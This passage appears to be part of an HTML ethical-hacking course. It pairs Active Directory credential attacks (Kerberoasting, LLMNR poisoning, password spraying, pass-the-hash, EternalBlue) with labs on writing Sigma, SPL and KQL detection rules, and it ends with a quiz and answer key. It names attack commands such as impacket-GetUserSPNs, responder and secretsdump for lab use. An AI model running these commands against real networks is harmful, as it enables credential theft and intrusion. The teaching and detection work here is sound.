+          <!-- row 2 kerberoast -->
+          <rect x="20" y="126" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-lbl" x="38" y="150" font-size="12">Kerberoast (Lab 6)</text>
+          <text class="d-sub" x="38" y="170">request service tickets for every SPN</text>
+          <text class="d-sub" x="38" y="185" class="d-mono">impacket-GetUserSPNs -request</text>
+          <rect x="490" y="126" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#4ade80"/>
+          <text class="d-lbl" x="508" y="150" font-size="12" fill="#4ade80" class="d-mono">4769</text>
+          <text class="d-sub" x="560" y="150">service-ticket requests, one user, many SPNs</text>
+          <text class="d-sub" x="508" y="170">encryption type <tspan class="d-mono">0x17</tspan> (RC4) = the tell</text>
+          <text class="d-sub" x="508" y="185">AS-REP roast shows as <tspan class="d-mono">4768</tspan></text>
+          <path d="M450,159 L488,159" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <!-- row 3 llmnr -->
+          <rect x="20" y="204" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-lbl" x="38" y="228" font-size="12">LLMNR poison (Lab 5)</text>
+          <text class="d-sub" x="38" y="248">answer a broadcast, capture NetNTLMv2</text>
+          <text class="d-sub" x="38" y="263" class="d-mono">responder -I eth0</text>
+          <rect x="490" y="204" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#4ade80"/>
+          <text class="d-sub" x="508" y="226">a host answering LLMNR for names it doesn't own</text>
+          <text class="d-sub" x="508" y="246">canary lookup fires; NetNTLMv2 auth to a rogue host</text>
+          <text class="d-sub" x="508" y="264">network/EDR detection, not one Event ID</text>
+          <path d="M450,237 L488,237" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+        </svg>
+        <figcaption><b>Orange did it, green saw it.</b> Every credential attack has a matching auth-log signature — which
+           is why authentication is where detection pays off most.</figcaption>
+      </figure>
+
+      <h2>Where each credential lives — click a target</h2>
+      <p>The same workflow, a different store per OS. This is the map behind everything today.</p>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 150" role="img" aria-label="Where each credential lives per target: Metasploitable2, Kioptrix and Stapler in /etc/shadow; Windows 7 and Windows 10 in the SAM and LSASS; the domain controller in NTDS.dit and Kerberos.">
+          <g class="node" data-node="lin" tabindex="0"><rect x="20" y="46" width="270" height="58" rx="9" fill="#1a1f2a" stroke="#4ade80"/><text class="d-title" x="155" y="72" text-anchor="middle" font-size="12.5">Linux targets</text><text class="d-sub" x="155" y="90" text-anchor="middle" class="d-mono">/etc/shadow</text></g>
+          <g class="node" data-node="win" tabindex="0"><rect x="335" y="46" width="270" height="58" rx="9" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="470" y="72" text-anchor="middle" font-size="12.5">Windows 7 / 10</text><text class="d-sub" x="470" y="90" text-anchor="middle" class="d-mono">SAM · LSASS</text></g>
+          <g class="node" data-node="dc" tabindex="0"><rect x="650" y="46" width="270" height="58" rx="9" fill="#1a1f2a" stroke="#e63946"/><text class="d-title" x="785" y="72" text-anchor="middle" font-size="12.5">The DC (ceh.lab)</text><text class="d-sub" x="785" y="90" text-anchor="middle" class="d-mono">NTDS.dit · Kerberos</text></g>
+        </svg>
+        <div class="dgm-hint">Click each target — the store, the tool, the hashcat mode.</div>
+        <div class="dgm-detail" data-detail="lin"><h5><span class="dd-tag">MSF2 · KIOPTRIX · STAPLER</span>/etc/shadow</h5><p><b>Salted Unix hashes.</b> Get a shell (or the file), <span class="mono">unshadow</span>, crack with John or hashcat. Salting means no rainbow tables and no cross-user reuse. Store: local file. Lab 3.</p></div>
+        <div class="dgm-detail" data-detail="win"><h5><span class="dd-tag">WIN7 · WIN10</span>SAM &amp; LSASS</h5><p><b>Local NT hashes in the SAM (mode 1000); live hashes + tickets in LSASS memory (mimikatz, S6).</b> Dump the SAM with <span class="mono">secretsdump</span>, crack, or pass-the-hash without cracking. No salt on NTLM. Lab 3 / Lab 6.</p></div>
+        <div class="dgm-detail" data-detail="dc"><h5><span class="dd-tag">THE DOMAIN CONTROLLER</span>NTDS.dit &amp; Kerberos</h5><p><b>Every domain hash in NTDS.dit, plus the whole Kerberos surface.</b> Kerberoast (13100) and AS-REP roast (18200) need only a low-priv user; NTDS extraction (secretsdump/DCSync) needs privilege but yields the entire domain. This box is why the AD lab exists. Lab 6.</p></div>
+      </figure>
+
+      <div class="box soc">
+        <span class="box-t">The honest EDR point</span>
+        <p>A modern EDR / identity-protection product (Microsoft Defender for Identity, and its peers) flags spraying and
+           Kerberoasting in <strong>near-real-time</strong>, often before the attacker finishes. Learning the attack
+           without the detection is learning half the job — and the detection half is the one you get <em>paid</em> for.
+           That's why the next 16 minutes is the most important block of the day.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P24 · LAB 7 — THE DETECTION RULE (SIGNATURE EXERCISE)  ========== -->
+  <section class="page" data-title="Lab 7: write the rule">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P24</span><span class="tag lab">Hands-on · everyone · the signature exercise</span><span class="time">⏱ 16 min</span></div>
+      <h1>Lab 7 — Detect the Attack You Just Ran</h1>
+      <p class="lede">Become the SOC analyst who catches you — using the auth logs your own spray, roast and poison
+         generated this session.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this is the exercise that defines the session</span>
+        <p>Nothing in the diploma closes the loop this cleanly. You generated the evidence in Labs 4–6. Now you'll read it
+           as a defender, identify the attack from the evidence <em>alone</em>, and write one <strong>working detection
+           rule</strong> that would fire on it. This is, almost exactly, the tier-1-into-tier-2 SOC job — and you'll have
+           done the attack and the detection for the same events.</p>
+      </div>
+
+      <div class="box warn">
+        <span class="box-t">You need the evidence from Labs 4–6</span>
+        <p>Have your saved DC Security log open (<span class="mono">lab4_spray.evtx</span>, <span class="mono">lab6_kerberoast.evtx</span>)
+           and the Responder log. No VM? Use <span class="mono">saved/lab4_4625.evtx</span> / <span class="mono">saved/lab6_4769.evtx</span>
+           — but you generated the real thing an hour ago; use yours.</p>
+      </div>
+
+      <h2>Step 1 — identify the attack from evidence alone</h2>
+      <ol class="steps">
+        <li>
+          <strong>Read the log without looking at your commands.</strong> Which attack was this?
+          <pre><code># in Event Viewer, filter the Security log to 4625; or from PowerShell:
+Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} |
+  Group-Object {$_.Properties[5].Value} | Sort-Object Count -Descending
+# many DISTINCT target usernames, ONE source IP, seconds apart → password spray</code></pre>
+          <div class="verify">
+            <h4>✓ Verification — you can state, from evidence only:</h4>
+            <ul>
+              <li>The <strong>attack type</strong> (many accounts + one source + one password window → spray; one user + many SPNs + RC4 → Kerberoast)</li>
+              <li>The <strong>source IP</strong>, the <strong>count of distinct accounts</strong>, and the <strong>time window</strong></li>
+              <li>Which <strong>Event IDs</strong> carry it (4625/4771 for spray, 4769 enc-type 0x17 for Kerberoast)</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 2 — write the rule (your choice of language)</h2>
+      <p>The cleanest signature is <strong>password spraying</strong>: many distinct accounts, one source, one password,
+         short window. Here is a <strong>worked Sigma rule</strong>; then complete <em>one</em> of the SPL or KQL
+         skeletons — your choice.</p>
+
+      <h3>Worked example — Sigma (vendor-neutral)</h3>
+      <pre><code>title: Password Spraying - many accounts, one source, short window
+id: b7c4e1a2-s4-lab-credattack-0001
+status: experimental
+description: One source failing authentication against many DISTINCT accounts in a
+  short window - a password spray. Modelled on events generated in the CEH S4 lab.
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4625            # failed logon (spray) ; use 4771 for Kerberos pre-auth fail
+    Status: '0xC000006A'     # bad password (not bad username)
+  timeframe: 5m
+  condition: selection | count(TargetUserName) by IpAddress &gt;= 10
+fields:
+  - IpAddress
+  - TargetUserName
+  - LogonType
+level: high
+tags:
+  - attack.credential_access
+  - attack.t1110.003        # Password Spraying</code></pre>
+      <p class="muted">The load-bearing lines are <span class="mono">timeframe</span> and
+         <span class="mono">count(TargetUserName) by IpAddress &gt;= 10</span> — "many distinct accounts, one source,
+         short window" as a threshold. Tune the number to your environment; too low and a broken service account with a
+         stale password trips it.</p>
+
+      <h3>Skeleton A — Splunk SPL (complete the blanks)</h3>
+      <pre><code>index=wineventlog EventCode=4625
+| bin _time span=5m
+| stats dc(Account_Name) AS distinct_users values(Account_Name) AS who by Source_Network_Address, _time
+| where distinct_users &gt;= ______            &lt;-- your threshold
+| sort - distinct_users</code></pre>
+
+      <h3>Skeleton B — Microsoft Sentinel KQL (complete the blanks)</h3>
+      <pre><code>SecurityEvent
+| where EventID == 4625
+| summarize distinct_users = dcount(TargetUserName), sample = make_set(TargetUserName, 20)
+    by IpAddress, bin(TimeGenerated, ____m)   // your window
+| where distinct_users &gt;= ______              // your threshold
+| order by distinct_users desc</code></pre>
+
+      <div class="box tip">
+        <span class="box-t">Prefer a different attack? Two alternative signatures</span>
+        <p><strong>Kerberoasting:</strong> <span class="mono">EventID 4769</span> where <span class="mono">TicketEncryptionType == 0x17</span>
+           (RC4) and one <span class="mono">IpAddress</span>/account requests many distinct <span class="mono">ServiceName</span>s
+           in a short window (map <span class="mono">T1558.003</span>). <strong>LLMNR poisoning:</strong> alert when any
+           host answers a planted "canary" name that shouldn't resolve, or on NetNTLMv2 auth to an unexpected host
+           (<span class="mono">T1557.001</span>). Write whichever you have the cleanest evidence for.</p>
+      </div>
+
+      <div class="verify">
+        <h4>✓ Verification — the deliverable</h4>
+        <ul>
+          <li>One <strong>complete, working</strong> rule (Sigma, SPL <em>or</em> KQL) that would fire on your Lab 4 spray (or Lab 6 roast)</li>
+          <li>A stated <strong>threshold and time window</strong>, one sentence on what would false-positive it</li>
+          <li>The <strong>ATT&amp;CK mapping</strong> on the rule (T1110.003 / T1558.003 / T1557.001)</li>
+          <li>One sentence on how a <em>slow</em> spray (a long wait between rounds) slips under your window — and what you'd change</li>
+        </ul>
+      </div>
+
+      <div class="box key-takeaway">
+        <span class="box-t">Why this is the most valuable 16 minutes today</span>
+        <p>You attacked a domain, generated the auth evidence, read it as a defender, and wrote the rule — for the same
+           events. That full loop is exactly what an identity-focused SOC hires for. Keep this rule; it goes in your
+           access-plan appendix and it's a portfolio piece.</p>
+      </div>
+
+      <div class="practice">
+        <div class="practice-h"><span class="pr-t">Practice this topic</span><span class="pr-plat">TryHackMe · free</span></div>
+        <p class="pr-why">The one free room that runs today's whole AD credential chain end to end — enumerate users,
+           AS-REP roast, Kerberoast, then pass-the-hash to the DC.</p>
+        <ul class="pr-list">
+          <li>
+            <div class="pr-row"><a href="https://tryhackme.com/room/attacktivedirectory" target="_blank" rel="noopener">Attacktive Directory</a><span class="res-tag free">Free</span><span class="pr-meta">~75 min · medium</span></div>
+            <p class="pr-note">kerbrute user-enum → <span class="mono">GetNPUsers</span> (AS-REP) → <span class="mono">GetUserSPNs</span>
+               (Kerberoast) → <span class="mono">secretsdump</span> → <span class="mono">evil-winrm</span>. <b>Do this one
+               to</b> run the exact tools from Labs 5–6 against a fresh domain, on the platform, for free.</p>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P25 · LAB 8 — THE ACCESS PLAN  ========== -->
+  <section class="page" data-title="Lab 8: the access plan">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P25</span><span class="tag lab">Hands-on · everyone · deliverable</span><span class="time">⏱ 12 min</span></div>
+      <h1>Lab 8 — Assemble the Access Plan</h1>
+      <p class="lede">Everything you found today, per host, in one document — literally Session 5's input.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">What you are about to do</span>
+        <p>Session 3 ended with a target profile (what's there). Session 4 ends with an <strong>access plan</strong> (how
+           you get in). Same discipline — conclusions over dumps, confidence stated — now built from the vulnerabilities
+           you confirmed and the credentials you took. This is the single most important artefact you carry into Session 5.</p>
+      </div>
+
+      <h2>The template — one block per host</h2>
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Field</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>Host / IP · role</td><td><span class="mono">192.168.56.107</span> · WIN7-TGT01 (legacy)</td></tr>
+          <tr><td>Confirmed vulnerabilities</td><td>MS17-010 — CVE-2017-0144 — CVSS 8.1 High — <strong>public exploit: yes</strong> (MSF <span class="mono">ms17_010_eternalblue</span>)</td></tr>
+          <tr><td>Credentials obtained (and how)</td><td>labuser:Summer2024 (SAM dump + hashcat -m 1000)</td></tr>
+          <tr><td>Other findings</td><td>SMBv1 enabled; local admin hash dumped</td></tr>
+          <tr><td><strong>Chosen way in (for S5)</strong></td><td>EternalBlue → SYSTEM (unauth, network-reachable, reliable)</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <ol class="steps">
+        <li>
+          <strong>Fill one block per host</strong> — Metasploitable2, Win7, Win10, the DC — from your Lab 1–6 output.
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>Every host has: confirmed vulns (CVE + CVSS + <strong>public exploit yes/no + reference</strong>), and any credentials obtained with <em>how</em></li>
+              <li>Every version/CVE is exact — it's an exploit key next session</li>
+              <li>Confidence stated where you're unsure (an unconfirmed CVE, a "roastable but not cracked")</li>
+            </ul>
+          </div>
+        </li>
+        <li>
+          <strong>Pick the single chosen way in per host</strong> — the one Session 5 will execute — with a one-line reason.
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>Each choice names a <em>specific</em> vuln or credential, not "SMB looks old"</li>
+              <li>The choice weighs reliability + reach + privilege (unauth SYSTEM beats a low-priv maybe)</li>
+            </ul>
+          </div>
+        </li>
+        <li>
+          <strong>Attach your Lab 7 detection rule</strong> as an appendix — the plan is attacker <em>and</em> defender.
+        </li>
+      </ol>
+
+      <div class="box key-takeaway">
+        <span class="box-t">How this is graded (pass / needs-review)</span>
+        <p><strong>Pass:</strong> a ranked, sourced, honest plan — exact CVEs with the public-exploit answer, credentials
+           with their method, a defensible single way in per host, and the detection rule attached.
+           <strong>Needs-review:</strong> a pile of raw tool output, or "cracked some hashes" with no CVE, method or
+           choice. Same standard as Session 3's target profile: conclusions, not dumps.</p>
+      </div>
+
+      <div class="box soc">
+        <span class="box-t">Continuity — where this sits in the chain</span>
+        <p>Session 2's recon report fed Session 3's target profile; that profile fed <em>this</em> access plan; and this
+           plan is <strong>Session 5's input</strong> — its "chosen way in" per host is the exact exploit S5 executes. The
+           same local lab (incl. the <span class="mono">ceh.lab</span> DC) is your one carry-through target from recon (S2)
+           all the way down through privilege escalation (S6). One target, profiled once, attacked all the way. Keep the
+           chain intact.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P26 · INTO SESSION 5  ========== -->
+  <section class="page" data-title="Into Session 5">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P26</span><span class="tag theory">Bridge · concept only</span><span class="time">⏱ 6 min</span></div>
+      <h1>You Have the Key. Next Session You Turn It.</h1>
+      <p class="lede">A concept, not a lab: the shell you're aiming for, and the framework that delivers it.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why just a concept here</span>
+        <p>Your access plan names a way in for every host. Session 5 executes those — manual exploitation, msfvenom
+           payloads, buffer overflows. Today we only frame the destination so the plan makes sense: what a shell is, and
+           the one distinction that decides whether your exploit even connects back.</p>
+      </div>
+
+      <h2>Bind vs reverse — the distinction that matters</h2>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 150" role="img" aria-label="A bind shell has the attacker connect inbound to a port opened on the target, usually blocked by the firewall; a reverse shell has the target connect outbound to the attacker's listener, which bypasses inbound firewall rules. Click each.">
+          <g class="node" data-node="bind" tabindex="0">
+            <text class="d-title" x="235" y="26" text-anchor="middle" font-size="12.5" fill="#ff7043">Bind shell — often blocked</text>
+            <rect x="40" y="44" width="150" height="50" rx="8" fill="#1f2533" stroke="#ff7043"/><text class="d-lbl" x="115" y="74" text-anchor="middle" font-size="12">Attacker</text>
+            <rect x="290" y="44" width="150" height="50" rx="8" fill="#1f2533" stroke="#768290"/><text class="d-lbl" x="365" y="68" text-anchor="middle" font-size="12">Target</text><text class="d-sub" x="365" y="84" text-anchor="middle">opens a port</text>
+            <path d="M190,69 L288,69" stroke="#ff7043" stroke-width="1.8" marker-end="url(#ar-o)"/>
+            <text class="d-sub" x="239" y="118" text-anchor="middle">attacker connects IN</text>
+          </g>
+          <g class="node" data-node="rev" tabindex="0">
+            <text class="d-title" x="705" y="26" text-anchor="middle" font-size="12.5" fill="#4ade80">Reverse shell — usually works</text>
+            <rect x="510" y="44" width="150" height="50" rx="8" fill="#1f2533" stroke="#768290"/><text class="d-lbl" x="585" y="68" text-anchor="middle" font-size="12">Target</text><text class="d-sub" x="585" y="84" text-anchor="middle">connects out</text>
+            <rect x="760" y="44" width="150" height="50" rx="8" fill="#1f2533" stroke="#4ade80"/><text class="d-lbl" x="835" y="74" text-anchor="middle" font-size="12">Attacker listener</text>
+            <path d="M660,69 L758,69" stroke="#4ade80" stroke-width="1.8" marker-end="url(#ar-grn)"/>
+            <text class="d-sub" x="710" y="118" text-anchor="middle">target connects OUT</text>
+          </g>
+        </svg>
+        <div class="dgm-hint">Click each — why one connects and one doesn't.</div>
+        <div class="dgm-detail" data-detail="bind"><h5><span class="dd-tag">BIND</span>Attacker connects in</h5><p><b>The target opens a listening port; the attacker connects to it.</b> Simple — but inbound connections are almost always blocked by the target's firewall, so it usually fails on a real network. Use it only when you control the path in.</p></div>
+        <div class="dgm-detail" data-detail="rev"><h5><span class="dd-tag">REVERSE</span>Target calls back</h5><p><b>The target connects out to the attacker's waiting listener.</b> Outbound is almost always allowed (that's how the box browses the web), so it bypasses inbound firewall rules. This is why Session 5's payloads "call back" — reverse is the default for a reason.</p></div>
+      </figure>
+
+      <div class="box note">
+        <span class="box-t">Metasploit, in one line</span>
+        <p><span class="mono">msfconsole</span> is the framework that ties it together: <span class="mono">search</span>
+           an exploit for a CVE in your access plan, set <span class="mono">RHOSTS</span>/<span class="mono">LHOST</span>,
+           choose a (reverse) payload, and <span class="mono">run</span>. You already found the modules in Lab 1
+           (<span class="mono">ms17_010_eternalblue</span>, <span class="mono">vsftpd</span>, <span class="mono">usermap_script</span>).
+           Session 5 fires them — and does it by hand first, so you understand what the framework automates. This is the
+           <span class="mono">T1210</span> hand-off.</p>
+      </div>
+
+      <div class="box key-takeaway">
+        <span class="box-t">The through-line</span>
+        <p>Recon (S2) found the target. Scanning (S3) mapped it. Vulnerability analysis and credential attacks (S4) got
+           you a way in. Session 5 turns the key; Session 6 escalates to own the box. One lab, one chain — and you're
+           halfway down it.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P27 · KNOWLEDGE CHECK  ========== -->
+  <section class="page" data-title="Knowledge check">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P27</span><span class="tag activity">Quiz</span><span class="time">⏱ 8 min</span></div>
+      <h1>Knowledge Check</h1>
+      <p class="lede">Ten questions. Click an answer to check it. The printable copy is in <span class="mono">exercises/session-04/quiz.md</span>.</p>
+    </div>
+    <div class="content">
+      <div id="quizScore" class="quiz-score">Answered <b>0</b> / 10</div>
+
+      <div class="q mcq" data-correct="c" data-why="A hash is one-way with no key — it can't be reversed, only guessed. Encoding (reversible, no key) and encryption (reversible, with a key) can both be undone.">
+        <p><span class="qn">Q1</span>Why can't you simply "decrypt" an NTLM hash back to the password?</p>
+        <ul class="opts"><li data-opt="a">The key is stored on the DC</li><li data-opt="b">It's Base64-encoded, not encrypted</li><li data-opt="c">Hashing is one-way with no key — there's nothing to reverse, so you guess inputs instead</li><li data-opt="d">You can, with the right AES key</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-correct="b" data-why="Responder captures the NetNTLMv2 challenge-response (hashcat -m 5600). The NT hash (mode 1000) never crosses the wire.">
+        <p><span class="qn">Q2</span>Responder poisons a broadcast and captures a credential off the wire. What did it actually get?</p>
+        <ul class="opts"><li data-opt="a">The plaintext password</li><li data-opt="b">The NetNTLMv2 challenge-response (crack with -m 5600)</li><li data-opt="c">The NT hash from the SAM (-m 1000)</li><li data-opt="d">A Kerberos TGT</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-correct="d" data-why="Spraying = one password against many accounts, one attempt each, so it stays under the lockout threshold. Brute-force (many passwords, one account) trips lockout after N tries.">
+        <p><span class="qn">Q3</span>Why does password spraying succeed where brute-force fails against a domain with a lockout policy?</p>
+        <ul class="opts"><li data-opt="a">Spraying is faster</li><li data-opt="b">Spraying uses stolen hashes</li><li data-opt="c">Spraying encrypts its traffic</li><li data-opt="d">One password across many accounts means one attempt each — it never reaches the lockout threshold</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-correct="a" data-why="Kerberoasting works because ANY authenticated user can request a service ticket for any SPN, and that ticket is encrypted with the service account's password hash — crackable offline (-m 13100).">
+        <p><span class="qn">Q4</span>What makes Kerberoasting possible for any low-privilege domain user?</p>
+        <ul class="opts"><li data-opt="a">Any user can request a service ticket for any SPN, and it's encrypted with the service account's hash</li><li data-opt="b">The DC emails the password</li><li data-opt="c">Service accounts have no password</li><li data-opt="d">It requires Domain Admin</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-correct="c" data-why="In a CVSS vector, AV:N (network), PR:N (no privileges) and UI:N (no user interaction) mean you can reach and trigger it remotely without help — the actionable part, beyond the raw number.">
+        <p><span class="qn">Q5</span>Two vulns both score CVSS 8.1. Which vector tells you it's reachable from your Kali box with no help from the victim?</p>
+        <ul class="opts"><li data-opt="a">AV:L/PR:H/UI:R</li><li data-opt="b">AV:P/AC:H</li><li data-opt="c">AV:N/PR:N/UI:N</li><li data-opt="d">S:C alone</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-correct="b" data-why="Pass-the-hash (T1550.002) authenticates with the NT hash directly — NTLM was designed to accept it — so no cracking is needed. A strong password doesn't help once the hash leaks.">
+        <p><span class="qn">Q6</span>You dumped an NT hash but it won't crack. How can it still get you in?</p>
+        <ul class="opts"><li data-opt="a">It can't — a strong password wins</li><li data-opt="b">Pass-the-hash — feed the hash straight to nxc/psexec; NTLM authenticates with it</li><li data-opt="c">Decode it from Base64</li><li data-opt="d">Email it to the DC</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-correct="d" data-why="The Kerberoast signature is Event 4769 (service-ticket request) with encryption type 0x17 (RC4), one account asking for many SPNs in a short window.">
+        <p><span class="qn">Q7</span>Which auth-log signature best identifies Kerberoasting on the DC?</p>
+        <ul class="opts"><li data-opt="a">4625 from many sources</li><li data-opt="b">4740 account lockout</li><li data-opt="c">A single 4624 success</li><li data-opt="d">A burst of 4769 with encryption type 0x17 (RC4), one user, many SPNs</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-correct="a" data-why="searchsploit queries a LOCAL offline copy of Exploit-DB — it never touches the target, so there's no log on the defender side. nmap --script vuln does touch the target and is logged.">
+        <p><span class="qn">Q8</span>Which of these leaves NO trace on the target?</p>
+        <ul class="opts"><li data-opt="a">searchsploit (local Exploit-DB query)</li><li data-opt="b">nmap --script vuln</li><li data-opt="c">A Nessus scan</li><li data-opt="d">GetUserSPNs -request</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-correct="c" data-why="As of 2026 the free Nessus Essentials tier scans 5 IPs (the old 'Nessus Home' was 16). Verifying a tool's current limits before quoting them is the standing habit.">
+        <p><span class="qn">Q9</span>How many IPs does the free Nessus Essentials tier scan in 2026?</p>
+        <ul class="opts"><li data-opt="a">Unlimited</li><li data-opt="b">16</li><li data-opt="c">5</li><li data-opt="d">32</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-correct="b" data-why="The countermeasure is to disable LLMNR (EnableMulticast=0) and NBT-NS via GPO. As of 2026 they're still on by default on Windows 10/11 — Microsoft is moving to mDNS but hasn't disabled them, and Responder poisons mDNS too.">
+        <p><span class="qn">Q10</span>What's the correct countermeasure to LLMNR/NBT-NS poisoning, and its 2026 status?</p>
+        <ul class="opts"><li data-opt="a">Nothing — it was removed from Windows years ago</li><li data-opt="b">Disable LLMNR + NBT-NS via GPO; they're still on by default in 2026, so the attack still works</li><li data-opt="c">Enable SMBv1</li><li data-opt="d">Turn off Kerberos</li></ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <h2>Short answer</h2>
+      <div class="q">
+        <p><span class="qn">Q11</span>In one sentence, why is the NetNTLMv2 you capture with Responder cracked with a different hashcat mode than the NT hash you dump from the SAM?</p>
+        <details><summary>Model answer</summary><p>They are different artefacts of the same account — the NT hash (mode 1000) is the stored secret, while NetNTLMv2 (mode 5600) is a keyed challenge-response computed from it, so each has its own format and mode.</p></details>
+      </div>
+      <div class="q">
+        <p><span class="qn">Q12</span>Give the one-line reason a modern EDR/identity product makes teaching credential attacks without their detection "half the job."</p>
+        <details><summary>Model answer</summary><p>Products like Defender for Identity flag spraying and Kerberoasting in near-real-time, so the paid work is writing and tuning the detections — the half of the skill that stops the attack, not just the half that runs it.</p></details>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P28 · PRACTICE RANGE + PLAN  ========== -->
+  <section class="page" data-title="Practice range &amp; plan">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P28</span><span class="tag lab">Practice · free path + local range</span><span class="time">⏱ self-study</span></div>
+      <h1>Practise Today's Attacks — Free</h1>
+      <p class="lede">A fully-free TryHackMe path for every topic, plus the local machines you already downloaded — every
+         one verified before it went on this page.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">How to use this page</span>
+        <p>Do the free rooms in order — each maps to a block from today. Then get reps on the local practice range, where
+           you own the targets and the authorisation. The strongest <em>dedicated</em> AD-credential rooms are mostly
+           premium; the one that isn't (<strong>Attacktive Directory</strong>) is a gem, and the local
+           <span class="mono">ceh.lab</span> DC is exactly why we don't depend on paid rooms.</p>
+      </div>
+
+      <div class="practice">
+        <div class="practice-h"><span class="pr-t">The free path</span><span class="pr-plat">TryHackMe · all verified free</span></div>
+        <p class="pr-why">One free room per half of the session, in the order that matches how we taught it.</p>
+        <ul class="pr-list">
+          <li><div class="pr-row"><a href="https://tryhackme.com/room/vulnerabilities101" target="_blank" rel="noopener">Vulnerabilities 101</a><span class="res-tag free">Free</span><span class="pr-meta">~20 min · easy</span></div><p class="pr-note">CVE, CVSS, and vulnerability research — the vuln-analysis half. <b>Do this first.</b></p></li>
+          <li><div class="pr-row"><a href="https://tryhackme.com/room/openvas" target="_blank" rel="noopener">OpenVAS</a><span class="res-tag free">Free</span><span class="pr-meta">~45 min · easy</span></div><p class="pr-note">Automated scanning with Greenbone/GVM — the free stand-in for the Nessus demo (the <span class="mono">nessus</span> room is private).</p></li>
+          <li><div class="pr-row"><a href="https://tryhackme.com/room/crackthehash" target="_blank" rel="noopener">Crack the Hash</a><span class="res-tag free">Free</span><span class="pr-meta">~45 min · easy</span></div><p class="pr-note">Identify and crack every common hash type with hashcat + John — pure reps on the pipeline from P13/P15.</p></li>
+          <li><div class="pr-row"><a href="https://tryhackme.com/room/hydra" target="_blank" rel="noopener">Hydra</a><span class="res-tag free">Free</span><span class="pr-meta">~45 min · easy</span></div><p class="pr-note">Online brute-force against real services — the hydra block, hands-on.</p></li>
+          <li><div class="pr-row"><a href="https://tryhackme.com/room/attacktivedirectory" target="_blank" rel="noopener">Attacktive Directory</a><span class="res-tag free">Free</span><span class="pr-meta">~75 min · medium</span></div><p class="pr-note"><b>The one to prioritise.</b> User enum → AS-REP roast → Kerberoast → secretsdump → evil-winrm: the exact chain from Labs 5–6 against a fresh domain.</p></li>
+          <li><div class="pr-row"><a href="https://tryhackme.com/room/networkservices2" target="_blank" rel="noopener">Network Services 2</a><span class="res-tag free">Free</span><span class="pr-meta">~60 min · easy</span></div><p class="pr-note">Service enumeration + hydra against them — carries over from Session 3, good warm-up for the online-attack half.</p></li>
+        </ul>
+      </div>
+
+      <div class="box warn">
+        <span class="box-t">Premium / private — honest, not required</span>
+        <p>These are good but paywalled or private; don't count on them: <span class="mono">passwordattacks</span> (Max),
+           <span class="mono">attackingkerberos</span> (Premium), <span class="mono">hashingcrypto101</span> (Premium),
+           <span class="mono">johntheripperbasics</span> (Premium), <span class="mono">nessus</span> and
+           <span class="mono">responder</span> (both private). Our local lab covers all of them for free.</p>
+      </div>
+
+      <h2>Local practice range — you already own these</h2>
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Machine</th><th>What to practise (today's skills)</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Metasploitable 3</strong> (Win)</td><td>Weak "Star Wars" accounts (<span class="mono">vagrant</span>, <span class="mono">leia_organa</span>…) — a perfect <strong>password-spray</strong> and <strong>SAM hash-crack</strong> target.</td></tr>
+          <tr><td><strong>Stapler 1</strong></td><td>The <span class="mono">enum4linux</span> user-list dump (peter, elly, kathy…) becomes your <strong>spray list</strong>; then crack the SSH/FTP creds you spray.</td></tr>
+          <tr><td><strong>Kioptrix 1</strong></td><td>mod_ssl 2.8.4 / Samba 2.2.1a — pure <strong>version → CVE → public exploit?</strong> reading (Lab 1 method).</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="box note">
+        <span class="box-t">Standing rule — authorisation does not travel</span>
+        <p>Every platform above hands you the target <em>and</em> written permission to attack it. That permission is
+           specific to that box. Cracking, spraying or poisoning anything you don't own — or weren't explicitly hired to
+           test — is a criminal offence. Host-only lab or authorised room only. Always.</p>
